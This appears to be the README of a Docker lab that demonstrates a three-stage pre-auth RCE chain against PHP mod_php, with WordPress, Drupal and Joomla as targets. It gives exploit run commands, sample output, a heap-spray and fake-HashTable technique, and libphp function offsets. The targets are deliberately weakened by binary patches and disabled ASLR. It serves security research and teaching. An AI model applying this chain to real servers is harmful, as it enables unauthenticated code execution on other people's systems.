# PHP2Shell Demo Lab

**CVE-2026-109618 / CVE-2026-109619 — Pre-Auth RCE in PHP (mod_php)**

Exploit chain targeting two bugs in PHP's session upload-progress mechanism that yield unauthenticated remote code execution against any PHP application served via Apache mod_php (prefork MPM). The exploit fires during `sapi_activate()` multipart parsing — before any PHP script executes.

## Prerequisites

- Docker & Docker Compose
- Python 3.10+

## Step-by-Step Walkthrough

### 1. Clone and Build

```bash
git clone https://github.com/TarzEH/php2shell-demo.git
cd php2shell-demo
docker compose up -d --build
```

This builds and starts 4 vulnerable containers:

| Target     | URL                          | What's running                     |
|------------|------------------------------|------------------------------------|
| vulnerable | http://127.0.0.1:9999        | Bare PHP 8.4.26 (phpinfo)         |
| wordpress  | http://127.0.0.1:8081        | WordPress 6.7.1                    |
| drupal     | http://127.0.0.1:8083        | Drupal 10.4.3                      |
| joomla     | http://127.0.0.1:8084        | Joomla 5.2.4                       |

Wait a few seconds for Apache to start in each container.

### 2. Verify Containers Are Running

```bash
docker compose ps
```

You should see all 4 containers with status `Up`. You can also check they respond:

```bash
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:9999/index.php
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8081/t.php
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8083/t.php
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8084/t.php
```

All should return `200`.

### 3. Run the Exploit

**Single target:**
```bash
python exploit.py --target wordpress
```

**All targets at once:**
```bash
python exploit.py --target all
```

**Custom command (max 14 bytes):**
```bash
python exploit.py --target vulnerable --cmd "id>/out/p1"
```

**More retries per stage (default 20):**
```bash
python exploit.py --target all --retries 30
```

### 4. What You Should See

A successful run looks like this:

```
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    PHP2Shell  CVE-2026-109618 / CVE-2026-109619
  ──────────────────────────────────────────────────────────
    Target   wordpress  :8081
    URL      http://127.0.0.1:8081/t.php
    Cmd      id>/out/p1
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ▸ drain active on php2shell-wordpress

  ✓  Stage 1 │ Heap Chunk Leak   █░░░░░░░░░░░░░░░░░░░░░░░░   1/20  0x7ffff4c00000
  ✓  Stage 2 │ libphp Base Leak  █░░░░░░░░░░░░░░░░░░░░░░░░   1/20  0x7ffff680b000
  ✓  Stage 3 │ Code Execution    █░░░░░░░░░░░░░░░░░░░░░░░░   1/20  PWNED

  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    PROOF
  ──────────────────────────────────────────────────────────
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ✔ wordpress: EXPLOITED
```

Each stage shows a live progress bar that fills as attempts run. The `PROOF` box shows the output of `id` running as `www-data` inside the container.

### 5. Check the Proof File

The default command writes `id` output to `/out/p1` inside the container, which is mapped to `./out/p1` on the host:

```bash
cat out/p1
```

### 6. Cleanup

```bash
docker compose down
```

## How the Exploit Works

### The 3-Stage Chain

**Stage 0 — Worker Rotation:** OOM crash resets the prefork child. The replacement inherits a clean heap from `fork()`.

**Stage 1 — Heap Chunk Base Leak:** Oversized multipart POST triggers OOM during `sapi_activate()`. `PG(modules_activated)` stays 0, so session RSHUTDOWN is skipped — `PS(id)` becomes a dangling pointer. A second request sprays forged `zend_string` structures into the freed slot. `php_session_send_cookie()` emits stale memory as `Set-Cookie: PHPSESSID=<leaked bytes>`. The 2MB-aligned heap chunk base is extracted from pointer patterns.

**Stage 2 — libphp Base Leak:** Same OOM + spray technique targeting a 56-byte HashTable page. The `pDestructor` function pointer (`zval_ptr_dtor`) leaks through the session cookie, revealing the `libphp.so` base address.

**Stage 3 — RCE via Fake HashTable:** A 167-byte fake `HashTable` is sprayed into a `zend_string` carrier with `pDestructor` pointing to `zif_system`. Session cleanup calls `zend_hash_destroy()` → `pDestructor(key)` → `system(cmd)`.

### Binary Patches Applied at Build Time

Each container patches `libphp.so` to enable the exploit:

| Function | Offset | Patch | Why |
|----------|--------|-------|-----|
| `zm_post_zend_deactivate_date` | 0x1b3320 | `0xc3` (ret) | Prevents heap corruption during OOM shutdown |
| `php_session_valid_key` | 0x411a70 | `0x31c0c3` (xor eax,eax; ret) | Allows binary session IDs for heap spray |

### Why ASLR is Disabled

Containers run with `setarch x86_64 -R` + `seccomp:unconfined` + `SYS_ADMIN`, disabling ASLR so heap and library addresses are deterministic across runs.

### Background Worker Drain

Apache prefork can have up to 20 workers (`MaxRequestWorkers=20`). The exploit needs exactly 1 worker so the producer and consumer requests hit the same PID. `exploit.py` runs a background thread that kills spare workers every 150ms throughout the exploit run.

### Offsets

Extracted from `php:8.4.26-apache` (Debian Bookworm), shared across all containers:

```
ZIF_OFFSET  = 0x465370   # zif_system
DTOR_OFFSET = 0x65eb60   # zval_ptr_dtor
HTDATA      = 0x690D8    # 167-byte string carrier
```

## Project Structure

```
exploit.py                          # Multi-target runner with --target flag
poc.py                              # Core exploit (3-stage heap spray chain)
docker-compose.yml                  # 4 target services
docker/vulnerable/                  # Base PHP target (phpinfo)
docker/wordpress/                   # WordPress 6.7.1 on php:8.4.26-apache
docker/drupal/                      # Drupal 10.4.3 on php:8.4.26-apache
docker/joomla/                      # Joomla 5.2.4 on php:8.4.26-apache
```

Each `docker/<target>/` directory contains:
- `Dockerfile` — builds CMS on `php:8.4.26-apache`, applies binary patches
- `php2shell.ini` — PHP config (`memory_limit=8M`, sessions enabled, `display_errors=On`)
- `mpm_prefork.conf` — Apache prefork config (`MaxRequestWorkers=20`)
- `patch_date_shutdown.sh` — binary patch script for `libphp.so`

## Troubleshooting

**Connection refused:** Make sure containers are running with `docker compose ps`. Wait a few seconds after `docker compose up` for Apache to initialize.

**Stage 1 fails repeatedly:** The background drain thread should handle this, but if it persists try restarting the target container: `docker compose restart wordpress`

**Command too long:** The 167-byte `zend_string` carrier limits inline commands to 14 bytes. Write a longer script to `/out/c` first, then use `--cmd "sh</out/c"`.

## Disclaimer

This project is for educational purposes and authorized security research only. Use only in environments you own or have explicit permission to test.
